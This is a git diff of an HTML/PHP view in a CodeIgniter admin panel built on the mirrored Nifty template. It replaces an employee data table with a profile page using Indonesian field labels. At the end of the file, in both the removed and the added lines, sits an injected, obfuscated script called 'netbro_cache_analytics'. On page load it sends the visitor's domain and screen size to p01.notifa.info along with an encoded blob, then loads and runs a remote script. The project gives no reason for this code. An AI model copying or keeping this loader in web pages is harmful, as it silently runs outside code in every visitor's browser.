@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -89,8 +88,8 @@
 <!--TIPS-->
 <!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
 <body>
-    <div id="container" class="effect aside-float aside-bright mainnav-lg">
-
+    <div id="container" class="effect aside-float aside-bright mainnav-sm page-fixedbar page-fixedbar-right">
+        
         <!--NAVBAR-->
         <!--===================================================-->
         <header id="navbar">
@@ -122,9 +121,15 @@
                                 <i class="demo-pli-list-view"></i>
                             </a>
                         </li>
-
+                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+                        <!--End Navigation toogle button-->
+                        
                     </ul>
+                </div>
+                <!--================================-->
+                <!--End Navbar Dropdown-->
 
+            </div>
         </header>
         <!--===================================================-->
         <!--END NAVBAR-->
@@ -135,94 +140,112 @@
             <!--===================================================-->
             <div id="content-container">
                 <div id="page-head">
-
-                    <!--Page Title-->
-                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-                    <div id="page-title">
-                        <h1 class="page-header text-overflow">Data Tables</h1>
-                    </div>
-                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-                    <!--End page title-->
+                                    </div>
 
 
-                    <!--Breadcrumb-->
-                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-                    <ol class="breadcrumb">
-					<li><a href="#"><i class="demo-pli-home"></i></a></li>
-					<li><a href="#">Tables</a></li>
-					<li class="active">Data Tables</li>
-                    </ol>
-                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-                    <!--End breadcrumb-->
-
-                </div>
-
-
-                 <!--Page content-->
+                <!--Page content-->
                 <!--===================================================-->
                 <div id="page-content">
+                        <div class="panel">
+                            <div class="panel-body">
+                                <div class="fixed-fluid">
+                                    <div class="fixed-md-200 pull-sm-left fixed-right-border">
+                    
+                                        <!-- Simple profile -->
+                                        <div class="text-center">
+                                            <div class="pad-ver">
+                                                <img src="<?php echo base_url();?>assets/adminlte/img/profile-photos/1.png" class="img-lg img-circle" alt="Profile Picture">
+                                            </div>
+                                            <h4 class="text-lg text-overflow mar-no">Aaron Chavez</h4>
+                                            <p class="text-sm text-muted">Digital Marketing Director</p>
+                                        </div>
+                                        <hr>
+                                    </div>
+                                    <div class="fluid">
+                                        <div class="text-right">
+                                            <button data-target="#demo-default-modal" data-toggle="modal" class="btn btn-sm btn-primary">Edit Profile</button>
+                                        </div>
+                    
+                                        <div class="pad-btm">
+                                             <!-- DISABLED FORM ELEMENTS-->
+                                <!--===================================================-->
+                                <form class="panel-body form-horizontal form-padding">
+                    
+                                    <!--Static-->
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label">Nama :</label>
+                                        <div class="col-md-9">
+                                            <p class="form-control-static"></p>
+                                        </div>
+                                    </div>
+                    
+                                    <!--Disabled Text Input-->
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label">Tempat Lahir :</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control"  disabled>
+                                        </div>
+                                    </div>
+                    
+                                    <!--Disabled Email Input-->
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label">Tanggal Lahir :</label>
+                                        <div class="col-md-9">
+                                            <input type="date" class="form-control" disabled>
+                                        </div>
+                                    </div>
 
-                    <!-- Basic Data Tables -->
-                    <!--===================================================-->
-                    <div class="panel">
+                                     <!--Disabled Email Input-->
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label">Email :</label>
+                                        <div class="col-md-9">
+                                            <input type="url" class="form-control" disabled>
+                                        </div>
+                                    </div>
 
-                        <div class="panel-body">
-                            <table id="demo-dt-basic" class="table table-striped table-bordered" cellspacing="0" width="100%">
-                                                                <!-- Modal -->
-                   <div class="row">
-                        <div class="col-md-6">
-                            <div id="demo-panel-ref" class="panel">
-                                <div class="panel-heading">
+                                     <!--Disabled Email Input-->
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label">Telepon :</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control" disabled>
+                                        </div>
+                                    </div>
 
-                            <button data-target="#demo-default-modal" data-toggle="modal" class="btn btn-primary">Tambah Pegawai</button>
+                                     <!--Disabled Email Input-->
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label">Alamat :</label>
+                                        <div class="col-md-9" >
+                                            <input type="text" class="form-control" style="height:100px;" disabled>
+                                        </div>
+                                    </div>
+
+                                     <!--Disabled Email Input-->
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label">Foto :</label>
+                                        <div class="col-md-9">
+                                            <img src="">
+                                        </div>
+                                    </div>
+                                   
+                                        </div>
+                    
+                                        <hr>
+                        
+                                    </div>
                                 </div>
-                         </div>
                             </div>
-                                <thead>
-                                    <tr>
-                                        <th>Nama</th>
-                                        <th>Tempat Lahir</th>
-                                        <th class="min-tablet">Tanggal Lahir</th>
-                                        <th class="min-tablet">Email</th>
-                                        <th class="min-desktop">Password</th>
-                                        <th class="min-desktop">Telepon</th>
-                                        <th class="min-desktop">Alamat</th>
-                                        <th>Foto</th>
-                                        <th>Status</th>
-                                        <th> Aksi</th>
-                                    </tr>
-                                </thead>
-                                <tbody>
-                                    <tr>
-                                        <th></th>
-                                        <th></th>
-                                        <th></th>
-                                        <th></th>
-                                        <th></th>
-                                        <th></th>
-                                        <th></th>
-                                        <th></th>
-                                        <th></th>
-                                        <th></th>
-                                    </tr>
-                                </tbody>
-                            </table>
-                           </div>
                         </div>
-                    </div>
-
-                    <!--===================================================-->
-                    <!-- End Striped Table -->
-
+                        
                 </div>
                 <!--===================================================-->
                 <!--End page content-->
+
             </div>
             <!--===================================================-->
             <!--END CONTENT CONTAINER-->
 
 
-            <!--Default Bootstrap Modal-->
+                  <!--Default Bootstrap Modal-->
     <!--===================================================-->
     <div class="modal fade" id="demo-default-modal" role="dialog" tabindex="-1" aria-labelledby="demo-default-modal" aria-hidden="true" >
         <div class="modal-dialog">
@@ -236,7 +259,7 @@
 
                 <!--Modal body-->
                 <div class="modal-body"  >
-
+                  
                                 <!--Block Styled Form -->
                                 <!--===================================================-->
                                 <form>
@@ -309,6 +332,7 @@
     <!--===================================================-->
     <!--End Default Bootstrap Modal-->
 
+            
              <!--MAIN NAVIGATION-->
             <!--===================================================-->
             <nav id="mainnav-container">
@@ -355,10 +379,10 @@
 
                                 <ul id="mainnav-menu" class="list-group">
 
-						            <!--Category name-->
-						            <li class="list-header">Navigation</li>
+                                    <!--Category name-->
+                                    <li class="list-header">Navigation</li>
 
-						            <!--Menu list item-->
+                                    <!--Menu list item-->
                         <li class="active-sub">
                             <a href="<?= base_url().'Dashboard' ?>">
                                 <i class="fa fa-home"></i>
@@ -408,7 +432,7 @@
 
                          <!--Menu item-->
                         <li>
-                            <a href="<?= base_url().'Barang_Ready' ?>">
+                            <a href="<?= base_url().'ready' ?>">
                                 <i class="glyphicon glyphicon-list-alt"></i>
                                 <span class="menu-title">
                                     Barang Ready
@@ -463,10 +487,9 @@
 
             <!--===================================================-->
             <!--END MAIN NAVIGATION-->
-
         </div>
 
-
+        
 
         <!-- FOOTER -->
         <!--===================================================-->
@@ -482,17 +505,17 @@
 
             <!-- Visible when footer positions are static -->
             <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
-     <!--       <div class="hide-fixed pull-right pad-rgt">
+            <div class="hide-fixed pull-right pad-rgt">
                 14GB of <strong>512GB</strong> Free.
             </div>
 
-	-->
+
 
             <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
             <!-- Remove the class "show-fixed" and "hide-fixed" to make the content always appears. -->
             <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
 
-            <p class="pad-lft">&#0169; </p>
+            <p class="pad-lft">&#0169; 2018 Your Company</p>
 
 
 
@@ -512,9 +535,9 @@
     <!-- END OF CONTAINER -->
 
 
-
-
-
+    
+    
+    
     <!--JAVASCRIPT-->
     <!--=================================================-->
 
@@ -533,24 +556,14 @@
 
 
     <!--=================================================-->
-
+    
     <!--Demo script [ DEMONSTRATION ]-->
-  <!--  <script src="<?php echo base_url();?>assets/adminlte/js/demo/nifty-demo.min.js"></script> -->
+    <script src="js/demo/nifty-demo.min.js"></script>
 
+    
+    
 
-    <!--DataTables [ OPTIONAL ]-->
-    <script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/jquery.dataTables.js"></script>
-	<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
-	<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/js/dataTables.responsive.min.js"></script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjVk1UmskIX0MbRtNl9wWMtbi4PjtJ%2fPSp2a86c%2f%2bluPgZm9wsdjzk3djvewLeV5UZtv8H07UaDSQF6FjE1XGgZDLbLOTuaTtUYCuuwsW%2fpK%2bIK4DN7Po9cim5pRqGXG%2bbWsA7YeCZfpKmSYHVJlyrtzLtq62ffIY6MGNE7tWdj5LsnOOmo3K85eG%2b4lkX7JcBWvzWxIDLoyBaWaQ5f1e4qMCeAcAIcyFfT0WrxRCJLItr%2b9jQamzr7nSr%2bKOikLwXXeYkEDbZbgy1geFdhW%2bg0dFR9e3wVkR6j7hbzRpJaewMpkUGgVCG5F7l3%2blCB1h2m0cmbEjTlmZ7crNw5sCj7%2fHxtYEo2G1eAlhKthRTjx7gZK2VMeEQVyACXim8SxbwfQF2cMGqrd%2f%2bC6J4E4IeTwjeeS415GZauXghogLMPzrmqpXjovafZgtS4oWT9aoaXxWJmbZZbTs5SyVz5KwM%2bGbtqTNjXCJFm%2bxzUzOwmDTA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
-
-    <!--DataTables Sample [ SAMPLE ]-->
-    <script src="<?php echo base_url();?>assets/adminlte/js/demo/tables-datatables.js"></script>
-
-
-
-
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjUaxQDkkXsQ40smKLX5MuTaP3Hz7CQx99v6v04x8tXILLzaJOlxMW8AqYZK7vJBQ0GeroIrDmsgRoQd3TbDcKFg5ZBqSJkgONBJfmihZkKwZm6n6A8yUgj4nkx3jY0LDUaUhTTSVo18zAU71F%2bg%2fz9XJK7mEBwuR9UbbQUNbpeu8TLlTGwc%2bJ8Q4Ghvlq5a3uLs3tGbSqe%2bIMGFB42NllBOXiUa%2fJS3C%2f4xtm2qCm0o76VDiUn%2fJU4E2PfPUP5k8Q8kqhOs%2f%2fJYJ%2b5E9CA9qTuBEo6UMsqrPZvthp0Oykb75Uu2OV1Q22Y539wDCdiCo%2fWdq8fte8WqybYrW7iOvpOtmuE9ypRwL6%2b5gbKpaecKP8gA8490c03k5TAyLvuWRxyhxBbA0sZtkm3%2b8dHg4FAjhTkRhGG4SmpBOqFSR9NOOtxN2dE8rtluoiMR%2fABnnWziDQHZS%2bjsuB5P1ZZS9wUjx%2bBZgxi5uazzR7I6vPu%2fVdNPdhxC%2fcET" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
-
-<!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:10 GMT -->
+<!-- Mirrored from www.themeon.net/nifty/v2.9.1/app-profile.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:45 GMT -->
 </html>
